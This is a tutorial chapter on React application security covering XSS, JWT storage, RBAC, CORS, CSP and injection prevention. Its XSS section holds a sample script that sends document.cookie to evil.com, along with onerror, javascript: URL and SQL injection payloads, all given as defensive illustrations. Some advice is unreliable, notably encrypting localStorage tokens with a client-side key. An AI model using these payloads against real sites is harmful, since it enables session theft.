# Chapter 19: Security - In-Depth Explanation

## Why Security Matters

**Security vulnerabilities can lead to:**
- üî¥ Data breaches
- üî¥ User account takeovers
- üî¥ Malicious code execution
- üî¥ Financial loss
- üî¥ Reputation damage
- üî¥ Legal consequences

**Common React Security Threats:**
1. **XSS (Cross-Site Scripting)** - Injecting malicious scripts
2. **CSRF (Cross-Site Request Forgery)** - Unauthorized actions
3. **Injection Attacks** - SQL, command injection
4. **Insecure Authentication** - Weak auth implementation
5. **Sensitive Data Exposure** - Leaking secrets
6. **Broken Access Control** - Unauthorized access

---

## 19.1 XSS Prevention

### What is XSS?

**Cross-Site Scripting (XSS)** is when attackers inject malicious scripts into web pages.

**Example Attack:**
```javascript
// Attacker enters this in a comment field:
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>

// If rendered unsafely, this script runs on all users' browsers!
```

### React's Built-in Protection

**React automatically escapes values:**

```javascript
function Component({ userInput }) {
  // ‚úÖ Safe - React escapes automatically
  return <div>{userInput}</div>;
  
  // Even if userInput is: <script>alert('XSS')</script>
  // React renders it as text, not executable code
}

// React converts:
<script>alert('XSS')</script>
// To:
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### Dangerous Patterns to Avoid

**dangerouslySetInnerHTML:**

```javascript
// ‚ùå DANGEROUS - Never do this with user input!
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// If html contains:
<img src="x" onerror="alert('XSS')" />
// This script will execute!

// ‚úÖ Safe - Sanitize first
import DOMPurify from 'dompurify';

function Comment({ html }) {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

**DOMPurify Configuration:**
```javascript
import DOMPurify from 'dompurify';

function RichTextDisplay({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'strong', 'em', 'u', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOW_DATA_ATTR: false
  });
  
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### URL-based XSS

```javascript
function UserProfile({ username }) {
  // ‚ùå Dangerous - XSS via URL
  return (
    <a href={`javascript:alert('XSS')`}>Profile</a>
  );
  
  // ‚úÖ Safe - Validate URLs
  const isValidUrl = (url) => {
    return url.startsWith('http://') || url.startsWith('https://');
  };
  
  const safeUrl = isValidUrl(url) ? url : '#';
  return <a href={safeUrl}>Profile</a>;
}
```

---

## 19.2 Authentication

### JWT Token Storage

**Options for storing tokens:**

```javascript
// ‚ùå Bad - localStorage (vulnerable to XSS)
localStorage.setItem('token', jwtToken);
// Any XSS attack can steal this!

// ‚ö†Ô∏è OK - sessionStorage (slightly better)
sessionStorage.setItem('token', jwtToken);
// Cleared when tab closes

// ‚úÖ Best - httpOnly cookies (set by server)
// Server sets: Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict
// JavaScript cannot access httpOnly cookies
// Protects against XSS attacks
```

**If you must use localStorage:**
```javascript
// At least encrypt the token
import CryptoJS from 'crypto-js';

const SECRET_KEY = process.env.REACT_APP_ENCRYPTION_KEY;

// Store
const encryptedToken = CryptoJS.AES.encrypt(token, SECRET_KEY).toString();
localStorage.setItem('token', encryptedToken);

// Retrieve
const encryptedToken = localStorage.getItem('token');
const decryptedToken = CryptoJS.AES.decrypt(encryptedToken, SECRET_KEY).toString(CryptoJS.enc.Utf8);
```

### Authentication Flow

```javascript
// Context for auth state
const AuthContext = createContext();

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    // Check if user is authenticated on mount
    const checkAuth = async () => {
      try {
        // Token is in httpOnly cookie (sent automatically)
        const response = await fetch('/api/auth/me');
        
        if (response.ok) {
          const userData = await response.json();
          setUser(userData);
        }
      } catch (error) {
        console.error('Auth check failed:', error);
      } finally {
        setLoading(false);
      }
    };
    
    checkAuth();
  }, []);
  
  const login = async (email, password) => {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
      credentials: 'include'  // Include cookies
    });
    
    if (!response.ok) {
      throw new Error('Login failed');
    }
    
    const userData = await response.json();
    setUser(userData);
    
    return userData;
  };
  
  const logout = async () => {
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include'
    });
    
    setUser(null);
  };
  
  const value = {
    user,
    loading,
    login,
    logout,
    isAuthenticated: !!user
  };
  
  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  return useContext(AuthContext);
}
```

### Protected Routes

```javascript
import { Navigate } from 'react-router-dom';
import { useAuth } from './AuthContext';

function ProtectedRoute({ children, requiredRole }) {
  const { user, loading } = useAuth();
  
  if (loading) {
    return <div>Loading...</div>;
  }
  
  if (!user) {
    return <Navigate to="/login" replace />;
  }
  
  if (requiredRole && user.role !== requiredRole) {
    return <Navigate to="/unauthorized" replace />;
  }
  
  return children;
}

// Usage
function App() {
  return (
    <Routes>
      <Route path="/login" element={<LoginPage />} />
      
      <Route 
        path="/dashboard" 
        element={
          <ProtectedRoute>
            <DashboardPage />
          </ProtectedRoute>
        } 
      />
      
      <Route 
        path="/admin" 
        element={
          <ProtectedRoute requiredRole="admin">
            <AdminPage />
          </ProtectedRoute>
        } 
      />
    </Routes>
  );
}
```

---

## 19.3 Authorization

### Role-Based Access Control (RBAC)

```javascript
// Define permissions
const PERMISSIONS = {
  VIEW_USERS: 'view_users',
  EDIT_USERS: 'edit_users',
  DELETE_USERS: 'delete_users',
  VIEW_REPORTS: 'view_reports'
};

const ROLES = {
  admin: [
    PERMISSIONS.VIEW_USERS,
    PERMISSIONS.EDIT_USERS,
    PERMISSIONS.DELETE_USERS,
    PERMISSIONS.VIEW_REPORTS
  ],
  manager: [
    PERMISSIONS.VIEW_USERS,
    PERMISSIONS.EDIT_USERS,
    PERMISSIONS.VIEW_REPORTS
  ],
  user: [
    PERMISSIONS.VIEW_USERS
  ]
};

// Hook for checking permissions
function usePermission() {
  const { user } = useAuth();
  
  const hasPermission = (permission) => {
    if (!user) return false;
    const userPermissions = ROLES[user.role] || [];
    return userPermissions.includes(permission);
  };
  
  const hasAnyPermission = (permissions) => {
    return permissions.some(permission => hasPermission(permission));
  };
  
  const hasAllPermissions = (permissions) => {
    return permissions.every(permission => hasPermission(permission));
  };
  
  return { hasPermission, hasAnyPermission, hasAllPermissions };
}

// Usage in components
function UserManagement() {
  const { hasPermission } = usePermission();
  
  return (
    <div>
      <h1>Users</h1>
      <UserList />
      
      {hasPermission(PERMISSIONS.EDIT_USERS) && (
        <button>Edit User</button>
      )}
      
      {hasPermission(PERMISSIONS.DELETE_USERS) && (
        <button>Delete User</button>
      )}
    </div>
  );
}
```

### Conditional Rendering Based on Auth

```javascript
function Dashboard() {
  const { user } = useAuth();
  const { hasPermission } = usePermission();
  
  return (
    <div>
      <h1>Dashboard</h1>
      
      {/* Show to all authenticated users */}
      <UserStats user={user} />
      
      {/* Show only to managers and admins */}
      {(user.role === 'manager' || user.role === 'admin') && (
        <TeamStats />
      )}
      
      {/* Show only with specific permission */}
      {hasPermission(PERMISSIONS.VIEW_REPORTS) && (
        <Reports />
      )}
      
      {/* Show only to admins */}
      {user.role === 'admin' && (
        <AdminPanel />
      )}
    </div>
  );
}
```

---

## 19.4 Secure Data Handling

### Never Expose Secrets

```javascript
// ‚ùå NEVER commit secrets to code
const API_KEY = 'sk_live_abc123xyz';  // DON'T DO THIS!

// ‚úÖ Use environment variables
const API_KEY = process.env.REACT_APP_API_KEY;

// ‚úÖ Server-side secrets (never in React)
// API keys, database credentials, etc. should only be on server

// .env
REACT_APP_API_URL=https://api.example.com
REACT_APP_PUBLIC_KEY=pk_live_abc123

// .env.local (gitignored)
REACT_APP_STRIPE_KEY=sk_test_xyz
```

### Sanitize User Input

```javascript
// ‚úÖ Always validate and sanitize
function SearchComponent() {
  const [query, setQuery] = useState('');
  
  const handleSearch = () => {
    // Sanitize before sending to API
    const sanitized = query.trim().toLowerCase();
    
    // Validate
    if (sanitized.length < 2) {
      return;
    }
    
    // Encode for URL
    const encoded = encodeURIComponent(sanitized);
    
    fetch(`/api/search?q=${encoded}`);
  };
  
  return (
    <div>
      <input 
        value={query}
        onChange={(e) => setQuery(e.target.value)}
        maxLength={100}  // Limit input length
      />
      <button onClick={handleSearch}>Search</button>
    </div>
  );
}
```

### Secure File Uploads

```javascript
function FileUpload() {
  const [error, setError] = useState(null);
  
  const handleFileChange = (e) => {
    const file = e.target.files[0];
    
    // Validate file type
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.type)) {
      setError('Invalid file type. Only JPEG, PNG, and GIF allowed.');
      return;
    }
    
    // Validate file size (max 5MB)
    const maxSize = 5 * 1024 * 1024;
    if (file.size > maxSize) {
      setError('File too large. Maximum size is 5MB.');
      return;
    }
    
    // Validate file name
    const invalidChars = /[^a-zA-Z0-9._-]/;
    if (invalidChars.test(file.name)) {
      setError('Invalid file name. Use only letters, numbers, dots, and hyphens.');
      return;
    }
    
    // Upload file
    uploadFile(file);
  };
  
  return (
    <div>
      <input 
        type="file"
        onChange={handleFileChange}
        accept="image/jpeg,image/png,image/gif"
      />
      {error && <div className="error">{error}</div>}
    </div>
  );
}
```

---

## 19.5 CORS (Cross-Origin Resource Sharing)

### What is CORS?

**CORS** controls which domains can access your API.

**Problem:**
```
Your React app: https://myapp.com
Your API: https://api.myapp.com

Browser blocks requests from myapp.com to api.myapp.com
(Different origins!)
```

**Solution - Configure CORS on Server:**

```javascript
// Express.js server
const cors = require('cors');

app.use(cors({
  origin: 'https://myapp.com',  // Allow only your domain
  credentials: true  // Allow cookies
}));

// Or multiple origins
app.use(cors({
  origin: ['https://myapp.com', 'https://staging.myapp.com'],
  credentials: true
}));
```

**Development Proxy (CRA):**
```javascript
// package.json
{
  "proxy": "http://localhost:3001"
}

// Now you can use relative URLs
fetch('/api/users');  // Proxied to http://localhost:3001/api/users
```

**Vite Proxy:**
```javascript
// vite.config.js
export default {
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, '')
      }
    }
  }
};
```

---

## 19.6 Content Security Policy (CSP)

### What is CSP?

**CSP** prevents XSS by controlling which resources can load.

**Setup in HTML:**
```html
<meta 
  http-equiv="Content-Security-Policy" 
  content="
    default-src 'self';
    script-src 'self' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
  "
/>
```

**Or via HTTP Header (better):**
```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted-cdn.com"
  );
  next();
});
```

---

## 19.7 Input Validation

### Client-Side Validation

```javascript
function RegistrationForm() {
  const validateEmail = (email) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
  };
  
  const validatePassword = (password) => {
    // At least 8 characters, 1 uppercase, 1 lowercase, 1 number
    const minLength = password.length >= 8;
    const hasUpper = /[A-Z]/.test(password);
    const hasLower = /[a-z]/.test(password);
    const hasNumber = /[0-9]/.test(password);
    
    return minLength && hasUpper && hasLower && hasNumber;
  };
  
  const validateUsername = (username) => {
    // Only alphanumeric and underscore
    const re = /^[a-zA-Z0-9_]+$/;
    return re.test(username) && username.length >= 3 && username.length <= 20;
  };
  
  const handleSubmit = (data) => {
    if (!validateEmail(data.email)) {
      setError('Invalid email');
      return;
    }
    
    if (!validatePassword(data.password)) {
      setError('Password does not meet requirements');
      return;
    }
    
    // Proceed with submission
    submitForm(data);
  };
}
```

### Server-Side Validation (Always Required!)

```javascript
// ‚ö†Ô∏è IMPORTANT: Always validate on server too!
// Client-side validation can be bypassed

// React sends to server:
const response = await fetch('/api/register', {
  method: 'POST',
  body: JSON.stringify({ email, password })
});

// Server must validate again:
// - Check email format
// - Check password strength
// - Check for SQL injection
// - Sanitize all inputs
```

---

## 19.8 Preventing Common Attacks

### SQL Injection Prevention

```javascript
// ‚ùå NEVER build SQL queries with user input (server-side)
const query = `SELECT * FROM users WHERE username = '${userInput}'`;
// If userInput is: ' OR '1'='1
// Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
// Returns all users!

// ‚úÖ Use parameterized queries (server-side)
const query = 'SELECT * FROM users WHERE username = ?';
db.execute(query, [userInput]);

// React's role: Don't trust user input, validate everything
```

### Command Injection Prevention

```javascript
// Never execute user input
// This should be on server, and never with user input

// ‚ùå Dangerous (server-side)
exec(`convert ${userFilename} output.jpg`);

// ‚úÖ Safe - validate and sanitize
const safeFilename = userFilename.replace(/[^a-zA-Z0-9._-]/g, '');
exec(`convert ${safeFilename} output.jpg`);
```

---

## Summary of Chapter 19

**Key Security Principles:**

1. **Never Trust User Input**
   - Validate everything
   - Sanitize before use
   - Escape for output

2. **XSS Prevention**
   - React escapes by default (use it!)
   - Sanitize HTML with DOMPurify
   - Avoid dangerouslySetInnerHTML
   - Validate URLs

3. **Authentication**
   - Use httpOnly cookies (best)
   - Encrypt tokens if using localStorage
   - Implement proper logout
   - Check auth on server

4. **Authorization**
   - Role-based access control
   - Permission checks
   - Protect routes and components

5. **Secure Communication**
   - HTTPS only in production
   - CORS configuration
   - Secure headers (CSP)

**Security Checklist:**

```javascript
‚úÖ Use HTTPS in production
‚úÖ Store tokens in httpOnly cookies (or encrypt in localStorage)
‚úÖ Validate all user input (client AND server)
‚úÖ Sanitize HTML before rendering
‚úÖ Use Content Security Policy
‚úÖ Configure CORS properly
‚úÖ Implement rate limiting (server)
‚úÖ Use secure headers
‚úÖ Keep dependencies updated
‚úÖ Never expose secrets in code
‚úÖ Validate file uploads
‚úÖ Implement proper authentication
‚úÖ Check permissions for protected actions
```

**Common Vulnerabilities:**

| Attack | Prevention |
|--------|-----------|
| XSS | Sanitize HTML, use React's escaping |
| CSRF | CSRF tokens, SameSite cookies |
| SQL Injection | Parameterized queries (server) |
| Insecure Auth | httpOnly cookies, strong passwords |
| Data Exposure | Encrypt sensitive data, HTTPS |
| Broken Access | Check permissions server-side |

**Interview Focus:**
- Explain XSS and prevention
- Show secure authentication
- Demonstrate authorization
- Discuss input validation
- Know CORS and CSP basics